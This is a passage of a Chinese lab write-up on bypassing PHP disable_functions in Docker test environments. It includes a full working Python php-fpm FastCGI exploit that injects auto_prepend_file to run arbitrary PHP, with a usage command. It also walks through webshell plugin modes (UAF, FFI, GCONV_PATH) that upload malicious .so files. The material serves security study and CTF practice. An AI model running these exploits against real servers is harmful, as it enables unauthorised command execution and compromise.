+<p><img src="/images/disable_func/22.png" alt="22" decoding="async" loading="lazy" width="1027" height="598"></p>
+<p><img src="/images/disable_func/23.png" alt="23" decoding="async" loading="lazy" width="1024" height="613"></p>
+<p>验证一下插件做了什么，查找最近修改的10个文件并按时间排序</p>
+<pre><code class="language-bash">find / -type f -exec ls -lt {} + | head -n 10</code></pre>
+<p>上传了恶意so文件，一个php的流量代理php文件，把流量代理到 /bin/sh php开启web服务器的端口</p>
+<p><img src="/images/disable_func/24.png" alt="24" decoding="async" loading="lazy" width="897" height="241"></p>
+<p>事后，再查看phpinfo信息里的<code>extension</code>配置项，没有任何变化，那么说，fastcgi协议伪造只是单次有效，不影响全局模式？够....够隐蔽？</p>
+<p>一个php-fpm未授权利用的exp</p>
+<pre><code class="language-python">import socket
+import random
+import argparse
+import sys
+from io import BytesIO
+
+# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
+
+PY2 = True if sys.version_info.major == 2 else False
+
+
+def bchr(i):
+    if PY2:
+        return force_bytes(chr(i))
+    else:
+        return bytes([i])
+
+def bord(c):
+    if isinstance(c, int):
+        return c
+    else:
+        return ord(c)
+
+def force_bytes(s):
+    if isinstance(s, bytes):
+        return s
+    else:
+        return s.encode('utf-8', 'strict')
+
+def force_text(s):
+    if issubclass(type(s), str):
+        return s
+    if isinstance(s, bytes):
+        s = str(s, 'utf-8', 'strict')
+    else:
+        s = str(s)
+    return s
+
+
+class FastCGIClient:
+    """A Fast-CGI Client for Python"""
+
+    # private
+    __FCGI_VERSION = 1
+
+    __FCGI_ROLE_RESPONDER = 1
+    __FCGI_ROLE_AUTHORIZER = 2
+    __FCGI_ROLE_FILTER = 3
+
+    __FCGI_TYPE_BEGIN = 1
+    __FCGI_TYPE_ABORT = 2
+    __FCGI_TYPE_END = 3
+    __FCGI_TYPE_PARAMS = 4
+    __FCGI_TYPE_STDIN = 5
+    __FCGI_TYPE_STDOUT = 6
+    __FCGI_TYPE_STDERR = 7
+    __FCGI_TYPE_DATA = 8
+    __FCGI_TYPE_GETVALUES = 9
+    __FCGI_TYPE_GETVALUES_RESULT = 10
+    __FCGI_TYPE_UNKOWNTYPE = 11
+
+    __FCGI_HEADER_SIZE = 8
+
+    # request state
+    FCGI_STATE_SEND = 1
+    FCGI_STATE_ERROR = 2
+    FCGI_STATE_SUCCESS = 3
+
+    def __init__(self, host, port, timeout, keepalive):
+        self.host = host
+        self.port = port
+        self.timeout = timeout
+        if keepalive:
+            self.keepalive = 1
+        else:
+            self.keepalive = 0
+        self.sock = None
+        self.requests = dict()
+
+    def __connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # if self.keepalive:
+        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
+        # else:
+        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
+        try:
+            self.sock.connect((self.host, int(self.port)))
+        except socket.error as msg:
+            self.sock.close()
+            self.sock = None
+            print(repr(msg))
+            return False
+        return True
+
+    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
+        length = len(content)
+        buf = bchr(FastCGIClient.__FCGI_VERSION) \
+               + bchr(fcgi_type) \
+               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(requestid &amp; 0xFF) \
+               + bchr((length &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(length &amp; 0xFF) \
+               + bchr(0) \
+               + bchr(0) \
+               + content
+        return buf
+
+    def __encodeNameValueParams(self, name, value):
+        nLen = len(name)
+        vLen = len(value)
+        record = b''
+        if nLen &lt; 128:
+            record += bchr(nLen)
+        else:
+            record += bchr((nLen &gt;&gt; 24) | 0x80) \
+                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(nLen &amp; 0xFF)
+        if vLen &lt; 128:
+            record += bchr(vLen)
+        else:
+            record += bchr((vLen &gt;&gt; 24) | 0x80) \
+                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(vLen &amp; 0xFF)
+        return record + name + value
+
+    def __decodeFastCGIHeader(self, stream):
+        header = dict()
+        header['version'] = bord(stream[0])
+        header['type'] = bord(stream[1])
+        header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])
+        header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])
+        header['paddingLength'] = bord(stream[6])
+        header['reserved'] = bord(stream[7])
+        return header
+
+    def __decodeFastCGIRecord(self, buffer):
+        header = buffer.read(int(self.__FCGI_HEADER_SIZE))
+
+        if not header:
+            return False
+        else:
+            record = self.__decodeFastCGIHeader(header)
+            record['content'] = b''
+
+            if 'contentLength' in record.keys():
+                contentLength = int(record['contentLength'])
+                record['content'] += buffer.read(contentLength)
+            if 'paddingLength' in record.keys():
+                skiped = buffer.read(int(record['paddingLength']))
+            return record
+
+    def request(self, nameValuePairs={}, post=''):
+        if not self.__connect():
+            print('connect failure! please check your fasctcgi-server !!')
+            return
+
+        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)
+        self.requests[requestId] = dict()
+        request = b""
+        beginFCGIRecordContent = bchr(0) \
+                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
+                                 + bchr(self.keepalive) \
+                                 + bchr(0) * 5
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
+                                              beginFCGIRecordContent, requestId)
+        paramsRecord = b''
+        if nameValuePairs:
+            for (name, value) in nameValuePairs.items():
+                name = force_bytes(name)
+                value = force_bytes(value)
+                paramsRecord += self.__encodeNameValueParams(name, value)
+
+        if paramsRecord:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
+
+        if post:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
+
+        self.sock.send(request)
+        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
+        self.requests[requestId]['response'] = b''
+        return self.__waitForResponse(requestId)
+
+    def __waitForResponse(self, requestId):
+        data = b''
+        while True:
+            buf = self.sock.recv(512)
+            if not len(buf):
+                break
+            data += buf
+
+        data = BytesIO(data)
+        while True:
+            response = self.__decodeFastCGIRecord(data)
+            if not response:
+                break
+            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
+                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
+                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
+                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
+                if requestId == int(response['requestId']):
+                    self.requests[requestId]['response'] += response['content']
+            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
+                self.requests[requestId]
+        return self.requests[requestId]['response']
+
+    def __repr__(self):
+        return "fastcgi connect host:{} port:{}".format(self.host, self.port)
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
+    parser.add_argument('host', help='Target host, such as 127.0.0.1')
+    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
+    parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php system("cat /flagfile"); exit; ?&gt;')
+    parser.add_argument('-p', '--port', help='FastCGI port', default=28074, type=int)
+
+    args = parser.parse_args()
+
+    client = FastCGIClient(args.host, args.port, 3, 0)
+    params = dict()
+    documentRoot = "/"
+    uri = args.file
+    content = args.code
+    params = {
+        'GATEWAY_INTERFACE': 'FastCGI/1.0',
+        'REQUEST_METHOD': 'POST',
+        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
+        'SCRIPT_NAME': uri,
+        'QUERY_STRING': '',
+        'REQUEST_URI': uri,
+        'DOCUMENT_ROOT': documentRoot,
+        'SERVER_SOFTWARE': 'php/fcgiclient',
+        'REMOTE_ADDR': '127.0.0.1',
+        'REMOTE_PORT': '9985',
+        'SERVER_ADDR': '127.0.0.1',
+        'SERVER_PORT': '80',
+        'SERVER_NAME': "localhost",
+        'SERVER_PROTOCOL': 'HTTP/1.1',
+        'CONTENT_TYPE': 'application/text',
+        'CONTENT_LENGTH': "%d" % len(content),
+        'PHP_VALUE': 'auto_prepend_file = php://input',
+        'PHP_ADMIN_VALUE': 'allow_url_include = On'
+    }
+    response = client.request(params, content)
+    print(force_text(response))</code></pre>
+<p>使用方法：</p>
+<pre><code class="language-bash">python3 exp.py -c '&lt;?php 要执行的php代码?&gt;' -p 28141 ip 存在的php文件</code></pre>
+<h2>06 Json Serializer UAF</h2>
+<h3>原理</h3>
+<p>此漏洞利用 json 序列化程序中的释放后使用漏洞，利用 json 序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令，UAF 一次可能不成功，多次尝试</p>
+<h3>配置与部署</h3>
+<p>php.ini 配置如下:</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</code></pre>
+<p><a href="https://github.com/Apursuit/AntSword-Labs/tree/master/bypass_disable_functions/6">Json Serializer UAF 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<h3>利用</h3>
+<p>使用条件</p>
+<ul>
+<li>Linux 操作系统
+PHP 版本</li>
+<li>7.1 - all versions to date</li>
+<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
+<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
+</ul>
+<p>看起来要求好像没有那么严格，只需要linux系统以及php版本在7.1左右即可</p>
+<p>正常连接后，无法执行命令</p>
+<p>使用蚁剑disable_functions插件，选择<code>Json Serializer UAF</code>模式</p>
+<p><img src="/images/disable_func/28.png" alt="28" decoding="async" loading="lazy" width="1024" height="640"></p>
+<h2>07 PHP7 GC with Certain Destructors UAF</h2>
+<h3>原理</h3>
+<p>此漏洞利用 PHP GC程序堆溢出来绕过 disable_functions，适用于目前 PHP7 绝大部分版本，UAF 一次可能不成功，多次尝试</p>
+<h3>配置与部署</h3>
+<p>php.ini 配置如下:</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</code></pre>
+<p><a href="https://github.com/Apursuit/AntSword-Labs/blob/master/bypass_disable_functions/7/README.md">PHP7 GC with Certain Destructors UAF 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<h3>利用</h3>
+<p>利用条件</p>
+<ul>
+<li>Linux 操作系统
+PHP 版本</li>
+<li>7.0 - all versions to date</li>
+<li>7.1 - all versions to date</li>
+<li>7.2 - all versions to date</li>
+<li>7.3 - all versions to date</li>
+</ul>
+<p>适用于绝大多数linux+php7的环境</p>
+<p>插件使用<code>PHP_GC_UAF</code>模式直接开日</p>
+<p><img src="/images/disable_func/29.png" alt="29" decoding="async" loading="lazy" width="1024" height="640"></p>
+<h2>08 利用 FFI 扩展</h2>
+<h3>原理</h3>
+<p>PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在 PHP 代码中去调用 C 代码，在php命令执行函数被禁用了，可以利用FFI扩展，使用c函数来执行系统命令</p>
+<h3>配置与部署</h3>
+<p>php.ini 配置如下:</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</code></pre>
+<p><a href="https://github.com/Apursuit/AntSword-Labs/blob/master/bypass_disable_functions/8">FFI 扩展 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<h3>利用</h3>
+<p>利用条件</p>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP &gt;= 7.4</li>
+<li>开启了 FFI 扩展且 ffi.enable=true</li>
+</ul>
+<p>通过木马执行phpinfo()函数，查看FFI扩展是否开启</p>
+<p>开启了FFI扩展</p>
+<p><img src="/images/disable_func/30.png" alt="30" decoding="async" loading="lazy" width="1505" height="469"></p>
+<p>蚁剑插件直接开日</p>
+<p>使用前，蚁剑为什么没有检测到ffi开启呢？</p>
+<p><img src="/images/disable_func/31.png" alt="31" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>查看最近10分钟修改的文件</p>
+<pre><code class="language-bash">find / -type f -exec ls -lt {} + | head -n 10</code></pre>
+<p>www-data用户最后一次文件操作是上传了可执行文件，利用ffi扩展，应该可以执行时才修改了蚁剑里ffi扩展的状态显示</p>
+<p><img src="/images/disable_func/32.png" alt="32" decoding="async" loading="lazy" width="1024" height="640"></p>
+<h2>09 ICONV 利用 GCONV_PATH 环境变量</h2>
+<h3>原理</h3>
+<p>PHP在执行iconv()函数时实际调用了glibc中一些和iconv相关的函数，其中一个叫iconv_open()的函数会根据GCONV_PATH环境变量找到系统的gconv-modules文件，再根据gconv-modules文件找到对应的.so文件进行链接。然后会调用.so文件中的gconv()和gonv_init()函数。修改GCONV_PATH环境变量指向上传的恶意so文件，使函数加载恶意的动态链接库，然后绕过禁用函数执行命令</p>
+<p>还是利用<code>putenv</code>函数，设置<code>GCONV_PATH</code>环境变量，利用 GCONV_PATH 环境变量, 加载 hack.so, 在 hack.so 中执行命令.</p>
+<h3>配置与部署</h3>
+<p>php.ini配置</p>
+<p><a href="https://github.com/Apursuit/AntSword-Labs/blob/master/bypass_disable_functions/9">利用 LD_PRELOAD 环境变量</a></p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18081</code>端口</p>
+<h3>利用</h3>
+<p>利用条件</p>
+<ul>
+<li>Linux 操作系统</li>
+<li>putenv() 函数</li>
+<li>iconv() 函数</li>
+<li>存在可写的目录, 需要上传 .so 文件</li>
+</ul>
+<blockquote>
+<p>相比 LD_PRELOAD 环境, 多禁用了 error_log</p>
+</blockquote>
+<p>蚁剑直接上插件，<code>iconv</code>模式</p>
+<p><img src="/images/disable_func/33.png" alt="33" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p><img src="/images/disable_func/34.png" alt="34" decoding="async" loading="lazy" width="735" height="206"></p>
+<p>使用插件后，进行的文件操作：创建了<code>/tmp/gconv_modules</code>文件夹，上传了<code>/tmp/恶意.so</code>文件，以及蚁剑代理流量到指定端口的php文件</p>
+<p><img src="/images/disable_func/35.png" alt="35" decoding="async" loading="lazy" width="991" height="390"></p>
+<p>进程里，<code>/bin/sh</code>使用php命令开启了一个web服务器，使用<code>-n</code>参数，忽略<code>php.ini</code>的配置文件影响，从而实现了绕过<code>disable_functions</code>的限制</p>
+<p><img src="/images/disable_func/36.png" alt="36" decoding="async" loading="lazy" width="970" height="366"></p>
+<p>以上都是<code>linux</code>系统下利用姿势，对于windows系统，网上看有中调用<code>COM</code>组件的姿势，通过<code>com</code>组件绕过disable_functions限制</p>
+<p>暂时没有研究，记录一些文章</p>
+<ul>
+<li><a href="https://blog.csdn.net/weixin_39555951/article/details/111206655">com 组件调用不起来_COM组件绕过disable_functions</a></li>
+<li><a href="https://www.cnblogs.com/DumpInfou/p/18023278">绕过disable_functions的限制</a></li>
+<li><a href="https://www.cnblogs.com/one-seven/p/15194350.html">Disable_functions绕过整合</a></li>
+</ul>
+<h2>参考</h2>
+<ul>
+<li><a href="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/">常见Bypass Disable Functions方法</a></li>
+<li><a href="https://eastjun.top/posts/bypass_disable_function/">PHP禁用函数绕过</a></li>
+<li><a href="https://github.com/Apursuit/AntSword-Labs/tree/master/bypass_disable_functions">AntSword-Labs/bypass_disable_functions</a></li>
+<li><a href="https://ssooking.github.io/2021/02/bypass-php-disable-functions/">bypass php disable_functions</a></li>
+<li><a href="https://www.anquanke.com/post/id/195686#h3-6">通过Antsword看绕过disable_functions</a></li>
+<li><a href="https://www.cnblogs.com/DumpInfou/p/18023278">绕过disable_functions的限制</a></li>
+<li><a href="https://wiki.wgpsec.org/knowledge/ctf/bypass-disable-function.html#bypass-disable-function">bypass disable_function</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>web</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#php</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
